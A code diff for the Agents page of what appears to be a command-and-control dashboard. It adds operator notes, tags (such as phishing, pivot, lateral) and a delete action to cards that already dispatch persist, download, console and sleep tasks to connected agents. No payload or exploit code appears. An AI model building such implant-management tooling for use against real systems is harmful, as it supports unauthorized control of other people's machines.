@@ -1,21 +1,39 @@
 import { useEffect, useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { getAgents, createTask, type Agent } from "../api/client";
-import { RefreshCw, Terminal, Download, Shield, ShieldOff, Clock, CheckCircle } from "lucide-react";
+import { getAgents, createTask, updateAgentNotes, deleteAgent, type Agent } from "../api/client";
+import { RefreshCw, Terminal, Download, Shield, ShieldOff, Clock, CheckCircle, StickyNote, Trash2 } from "lucide-react";
 
-function AgentCard({ agent, onConsole, index }: { agent: Agent; onConsole: () => void; index: number }) {
+function AgentCard({ agent, onConsole, index, onDelete }: { agent: Agent; onConsole: () => void; index: number; onDelete: () => void }) {
   const diffSec = Math.floor((Date.now() - new Date(agent.last_seen + "Z").getTime()) / 1000);
   const alive   = diffSec < 30;
   const [action, setAction]  = useState<string | null>(null);
   const [dlPath, setDlPath]  = useState("");
   const [sleepVal, setSleep] = useState(agent.sleep);
   const [feedback, setFb]    = useState("");
+  const [notes, setNotes]    = useState(agent.notes ?? "");
+  const [tags, setTags]      = useState(agent.tags ?? "");
+  const [savingNotes, setSavingNotes] = useState(false);
 
   const send = async (cmd: string) => {
     await createTask(agent.id, cmd);
     setFb("Task dispatched");
     setTimeout(() => setFb(""), 2500);
     setAction(null);
+  };
+
+  const saveNotes = async () => {
+    setSavingNotes(true);
+    await updateAgentNotes(agent.id, notes, tags);
+    setSavingNotes(false);
+    setFb("Notes saved");
+    setTimeout(() => setFb(""), 2000);
+    setAction(null);
+  };
+
+  const handleDelete = async () => {
+    if (!confirm(`Delete agent ${agent.hostname}? This will also delete all its tasks.`)) return;
+    await deleteAgent(agent.id);
+    onDelete();
   };
 
   const ActionBtn = ({ icon: Icon, label, onClick, danger }: any) => (
@@ -103,12 +121,54 @@ function AgentCard({ agent, onConsole, index }: { agent: Agent; onConsole: () =>
       </AnimatePresence>
 
       <div className="flex gap-2 flex-wrap">
-        <ActionBtn icon={Terminal}  label="Console"   onClick={onConsole} />
-        <ActionBtn icon={Download}  label="Download"  onClick={() => setAction(action === "download" ? null : "download")} />
-        <ActionBtn icon={Shield}    label="Persist"   onClick={() => send("persist")} />
-        <ActionBtn icon={ShieldOff} label="Unpersist" onClick={() => send("unpersist")} danger />
-        <ActionBtn icon={Clock}     label="Sleep"     onClick={() => setAction(action === "sleep" ? null : "sleep")} />
+        <ActionBtn icon={Terminal}    label="Console"   onClick={onConsole} />
+        <ActionBtn icon={Download}    label="Download"  onClick={() => setAction(action === "download" ? null : "download")} />
+        <ActionBtn icon={Shield}      label="Persist"   onClick={() => send("persist")} />
+        <ActionBtn icon={ShieldOff}   label="Unpersist" onClick={() => send("unpersist")} danger />
+        <ActionBtn icon={Clock}       label="Sleep"     onClick={() => setAction(action === "sleep" ? null : "sleep")} />
+        <ActionBtn icon={StickyNote}  label="Notes"     onClick={() => setAction(action === "notes" ? null : "notes")} />
+        <ActionBtn icon={Trash2}      label="Delete"    onClick={handleDelete} danger />
       </div>
+
+      <AnimatePresence>
+        {action === "notes" && (
+          <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} exit={{ opacity: 0, height: 0 }}
+            transition={{ duration: 0.2 }} className="mt-3 flex flex-col gap-2 overflow-hidden">
+            <input value={tags} onChange={e => setTags(e.target.value)}
+              placeholder="Tags (comma-separated: phishing, pivot, lateral)"
+              className="input-base rounded-xl px-3 py-2 text-xs mono w-full" />
+            <textarea value={notes} onChange={e => setNotes(e.target.value)}
+              placeholder="Operator notes…"
+              rows={3}
+              className="input-base rounded-xl px-3 py-2 text-xs mono w-full resize-none" />
+            <div className="flex gap-2">
+              <motion.button whileTap={{ scale: 0.96 }} onClick={saveNotes} disabled={savingNotes}
+                className="btn-primary px-3 py-1.5 rounded-xl text-xs flex items-center gap-1.5">
+                {savingNotes
+                  ? <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }} className="w-3 h-3 rounded-full border border-white border-t-transparent" />
+                  : <CheckCircle size={11} />} Save
+              </motion.button>
+              <button onClick={() => setAction(null)} className="text-nyx-muted text-xs px-2 hover:text-nyx-text">Cancel</button>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {(tags || notes) && action !== "notes" && (
+        <div className="mt-3 pt-3 flex flex-col gap-1.5" style={{ borderTop: "1px solid #F0EBE3" }}>
+          {tags && (
+            <div className="flex flex-wrap gap-1">
+              {tags.split(",").filter(Boolean).map(t => (
+                <span key={t} className="text-xs px-2 py-0.5 rounded-md font-medium"
+                  style={{ background: "#EEF2FF", color: "#1E3CB8", border: "1px solid rgba(30,60,184,0.2)" }}>
+                  {t.trim()}
+                </span>
+              ))}
+            </div>
+          )}
+          {notes && <p className="mono text-xs text-nyx-muted">{notes}</p>}
+        </div>
+      )}
     </motion.div>
   );
 }
@@ -146,7 +206,7 @@ export default function Agents({ onNavigateConsole }: AgentsProps) {
             No agents connected.
           </motion.div>
         )}
-        {agents.map((a, i) => <AgentCard key={a.id} agent={a} onConsole={() => onNavigateConsole?.()} index={i} />)}
+        {agents.map((a, i) => <AgentCard key={a.id} agent={a} onConsole={() => onNavigateConsole?.()} index={i} onDelete={load} />)}
       </div>
     </div>
   );
